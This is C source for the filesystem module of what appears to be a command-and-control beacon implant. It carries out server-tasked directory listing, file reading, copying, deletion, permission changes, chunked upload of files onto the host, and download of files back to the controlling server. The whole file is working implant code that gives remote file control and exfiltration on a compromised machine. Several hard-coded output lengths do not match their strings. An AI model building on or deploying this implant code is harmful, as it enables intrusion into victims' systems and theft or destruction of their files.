// Filesystem commands: ls, cd, pwd, rm, cp, mv, upload, download, cat, mkdir, chmod

#include "../core/beacon.h"
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>

// ---- Helper: extract null-terminated string from payload -------------------
static char* pay_to_str(const BeaconTask* t) {
    if (!t->pay || t->pay_len == 0) return NULL;
    char* s = (char*)bmalloc(t->pay_len + 1);
    if (!s) return NULL;
    memcpy(s, t->pay, t->pay_len);
    s[t->pay_len] = 0;
    return s;
}

// ---- ls --------------------------------------------------------------------
void cmd_ls(const BeaconTask* t) {
    out_begin(t->id, RESP_LS);

    char* path = pay_to_str(t);
    if (!path) path = pay_to_str(t);
    const char* dir = path ? path : ".";

    DIR* d = opendir(dir);
    if (!d) {
        char err[256];
        int n = snprintf(err, sizeof(err), "error: opendir(%s): %s\n", dir, strerror(errno));
        out_write(err, (size_t)n);
        bfree(path);
        return;
    }

    // Header
    out_write("Type  Size         Date                 Name\n", 45);
    out_write("----  ----------   -------------------  ----\n", 45);

    struct dirent* ent;
    while ((ent = readdir(d)) != NULL) {
        // Skip . and ..
        if (ent->d_name[0] == '.' && (ent->d_name[1] == 0 ||
            (ent->d_name[1] == '.' && ent->d_name[2] == 0)))
            continue;

        // Build full path for stat
        char full[4096];
        snprintf(full, sizeof(full), "%s/%s", dir, ent->d_name);

        struct stat st;
        char line[512];
        int len;

        if (stat(full, &st) == 0) {
            char type = S_ISDIR(st.st_mode) ? 'D' : S_ISLNK(st.st_mode) ? 'L' : 'F';
            struct tm tm;
            localtime_r(&st.st_mtime, &tm);
            char date[24];
            strftime(date, sizeof(date), "%Y-%m-%d %H:%M:%S", &tm);
            len = snprintf(line, sizeof(line), "%c     %-12ld %s  %s\n",
                           type, (long)st.st_size, date, ent->d_name);
        } else {
            len = snprintf(line, sizeof(line), "?     %-12s %s  %s\n",
                           "?", "----.--.-- --:--:--", ent->d_name);
        }
        if (len > 0) out_write(line, (size_t)len);
    }
    closedir(d);
    bfree(path);
}

// ---- cd --------------------------------------------------------------------
void cmd_cd(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);
    char* path = pay_to_str(t);
    if (!path) { out_write("error: no path\n", 15); return; }

    if (chdir(path) != 0) {
        char err[256];
        int n = snprintf(err, sizeof(err), "error: chdir(%s): %s\n", path, strerror(errno));
        out_write(err, (size_t)n);
    } else {
        char cwd[4096];
        if (getcwd(cwd, sizeof(cwd))) {
            out_write(cwd, strlen(cwd));
            out_write("\n", 1);
        }
    }
    bfree(path);
}

// ---- pwd -------------------------------------------------------------------
void cmd_pwd(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);
    char cwd[4096];
    if (getcwd(cwd, sizeof(cwd))) {
        out_write(cwd, strlen(cwd));
        out_write("\n", 1);
    } else {
        out_write("error: getcwd failed\n", 21);
    }
}

// ---- rm --------------------------------------------------------------------
void cmd_rm(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);
    char* path = pay_to_str(t);
    if (!path) { out_write("error: no path\n", 15); return; }

    struct stat st;
    int rc;
    if (stat(path, &st) == 0 && S_ISDIR(st.st_mode)) {
        rc = rmdir(path);
    } else {
        rc = unlink(path);
    }

    if (rc != 0) {
        char err[256];
        int n = snprintf(err, sizeof(err), "error: rm(%s): %s\n", path, strerror(errno));
        out_write(err, (size_t)n);
    } else {
        out_write("ok\n", 3);
    }
    bfree(path);
}

// ---- cp --------------------------------------------------------------------
void cmd_cp(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);

    // payload: "src\0dst"
    if (!t->pay || t->pay_len < 3) {
        out_write("error: usage cp <src> <dst>\n", 27);
        return;
    }

    // Find null separator
    char* src = (char*)t->pay;
    size_t src_len = strnlen(src, t->pay_len);
    if (src_len >= t->pay_len - 1) {
        out_write("error: missing destination\n", 26);
        return;
    }
    char* dst = src + src_len + 1;

    int fd_src = open(src, O_RDONLY);
    if (fd_src < 0) {
        char err[256];
        int n = snprintf(err, sizeof(err), "error: open(%s): %s\n", src, strerror(errno));
        out_write(err, (size_t)n);
        return;
    }

    int fd_dst = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd_dst < 0) {
        char err[256];
        int n = snprintf(err, sizeof(err), "error: create(%s): %s\n", dst, strerror(errno));
        out_write(err, (size_t)n);
        close(fd_src);
        return;
    }

    char buf[8192];
    ssize_t nr;
    while ((nr = read(fd_src, buf, sizeof(buf))) > 0) {
        ssize_t nw = write(fd_dst, buf, (size_t)nr);
        if (nw != nr) {
            out_write("error: write failed\n", 20);
            break;
        }
    }
    close(fd_src);
    close(fd_dst);
    out_write("ok\n", 3);
}

// ---- mv --------------------------------------------------------------------
void cmd_mv(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);

    if (!t->pay || t->pay_len < 3) {
        out_write("error: usage mv <src> <dst>\n", 27);
        return;
    }

    char* src = (char*)t->pay;
    size_t src_len = strnlen(src, t->pay_len);
    if (src_len >= t->pay_len - 1) {
        out_write("error: missing destination\n", 26);
        return;
    }
    char* dst = src + src_len + 1;

    if (rename(src, dst) != 0) {
        char err[256];
        int n = snprintf(err, sizeof(err), "error: mv(%s → %s): %s\n", src, dst, strerror(errno));
        out_write(err, (size_t)n);
    } else {
        out_write("ok\n", 3);
    }
}

// ---- upload (server -> beacon: write file, chunked) -------------------------
// Payload format per chunk: [u32 LE path_len][path bytes][u64 LE offset][data]
// offset==0 -> create/truncate file;  offset>0 -> open existing, seek to offset.
void cmd_upload(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);

    // Minimum: 4 (path_len) + 1 (path) + 8 (offset) = 13 bytes
    if (!t->pay || t->pay_len < 13) {
        out_write("error: upload payload too short\n", 31);
        return;
    }

    const uint8_t* p = t->pay;

    // Read path_len (u32 LE)
    uint32_t path_len = (uint32_t)p[0]
                      | ((uint32_t)p[1] << 8)
                      | ((uint32_t)p[2] << 16)
                      | ((uint32_t)p[3] << 24);
    p += 4;

    if (path_len == 0 || path_len > 4096 || 4 + path_len + 8 > t->pay_len) {
        out_write("error: invalid path length\n", 27);
        return;
    }

    // Copy path to null-terminated buffer
    char path_buf[4097];
    memcpy(path_buf, p, path_len);
    path_buf[path_len] = '\0';
    p += path_len;

    // Read offset (u64 LE)
    uint64_t offset = (uint64_t)p[0]
                    | ((uint64_t)p[1] << 8)
                    | ((uint64_t)p[2] << 16)
                    | ((uint64_t)p[3] << 24)
                    | ((uint64_t)p[4] << 32)
                    | ((uint64_t)p[5] << 40)
                    | ((uint64_t)p[6] << 48)
                    | ((uint64_t)p[7] << 56);
    p += 8;

    // Remaining bytes = chunk data
    size_t hdr_size = 4 + path_len + 8;
    const uint8_t* data = p;
    size_t data_len = t->pay_len - hdr_size;

    int fd;
    if (offset == 0) {
        // First chunk: create or truncate
        fd = open(path_buf, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    } else {
        // Subsequent chunk: open existing, seek to offset
        fd = open(path_buf, O_WRONLY, 0644);
    }

    if (fd < 0) {
        char err[256];
        int n = snprintf(err, sizeof(err), "error: open(%s): %s\n", path_buf, strerror(errno));
        out_write(err, (size_t)n);
        return;
    }

    if (offset > 0) {
        if (lseek(fd, (off_t)offset, SEEK_SET) < 0) {
            char err[256];
            int n = snprintf(err, sizeof(err), "error: lseek(%s, %lu): %s\n",
                             path_buf, (unsigned long)offset, strerror(errno));
            out_write(err, (size_t)n);
            close(fd);
            return;
        }
    }

    // Write chunk data
    size_t written = 0;
    while (written < data_len) {
        ssize_t nw = write(fd, data + written, data_len - written);
        if (nw <= 0) {
            out_write("error: write failed\n", 20);
            close(fd);
            return;
        }
        written += (size_t)nw;
    }
    close(fd);

    char msg[256];
    int n = snprintf(msg, sizeof(msg), "uploaded %zu bytes to %s (offset %lu)\n",
                     data_len, path_buf, (unsigned long)offset);
    out_write(msg, (size_t)n);
}

// ---- download (beacon -> server: read file) ---------------------------------
// Payload = UTF-8 path. Response = raw file content via RESP_FILE chunks.
// No filename header — client tracks local path by task_id.
void cmd_download(const BeaconTask* t) {
    out_begin(t->id, RESP_FILE);

    char* path = pay_to_str(t);
    if (!path) { out_write("error: no path\n", 15); return; }

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        out_begin(t->id, RESP_ERROR);
        char err[256];
        int n = snprintf(err, sizeof(err), "error: open(%s): %s\n", path, strerror(errno));
        out_write(err, (size_t)n);
        bfree(path);
        return;
    }

    // Read and send raw content in chunks (up to 16 KiB per read)
    char buf[16384];
    ssize_t nr;
    while ((nr = read(fd, buf, sizeof(buf))) > 0) {
        out_write(buf, (size_t)nr);
        if (out_remaining() < sizeof(buf)) {
            out_flush_chunk(get_transport(), 0);
        }
    }
    close(fd);
    bfree(path);
}

// ---- cat -------------------------------------------------------------------
void cmd_cat(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);

    char* path = pay_to_str(t);
    if (!path) { out_write("error: no path\n", 15); return; }

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        char err[256];
        int n = snprintf(err, sizeof(err), "error: open(%s): %s\n", path, strerror(errno));
        out_write(err, (size_t)n);
        bfree(path);
        return;
    }

    char buf[4096];
    ssize_t nr;
    while ((nr = read(fd, buf, sizeof(buf))) > 0) {
        out_write(buf, (size_t)nr);
        if (out_remaining() < 1024) {
            out_flush_chunk(get_transport(), 0);
        }
    }
    close(fd);
    bfree(path);
}

// ---- mkdir -----------------------------------------------------------------
void cmd_mkdir_cmd(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);
    char* path = pay_to_str(t);
    if (!path) { out_write("error: no path\n", 15); return; }

    if (mkdir(path, 0755) != 0) {
        char err[256];
        int n = snprintf(err, sizeof(err), "error: mkdir(%s): %s\n", path, strerror(errno));
        out_write(err, (size_t)n);
    } else {
        out_write("ok\n", 3);
    }
    bfree(path);
}

// ---- chmod -----------------------------------------------------------------
void cmd_chmod_cmd(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);

    // payload: "mode\0path" (e.g. "755\0/tmp/test")
    if (!t->pay || t->pay_len < 3) {
        out_write("error: usage chmod <mode> <path>\n", 32);
        return;
    }

    char* mode_str = (char*)t->pay;
    size_t mode_len = strnlen(mode_str, t->pay_len);
    if (mode_len >= t->pay_len - 1) {
        out_write("error: missing path\n", 20);
        return;
    }
    char* path = mode_str + mode_len + 1;

    // Parse octal mode
    mode_t mode = 0;
    for (size_t i = 0; i < mode_len; ++i) {
        if (mode_str[i] < '0' || mode_str[i] > '7') {
            out_write("error: invalid mode (use octal)\n", 31);
            return;
        }
        mode = (mode << 3) | (mode_str[i] - '0');
    }

    if (chmod(path, mode) != 0) {
        char err[256];
        int n = snprintf(err, sizeof(err), "error: chmod(%s, %03o): %s\n",
                         path, mode, strerror(errno));
        out_write(err, (size_t)n);
    } else {
        out_write("ok\n", 3);
    }
}
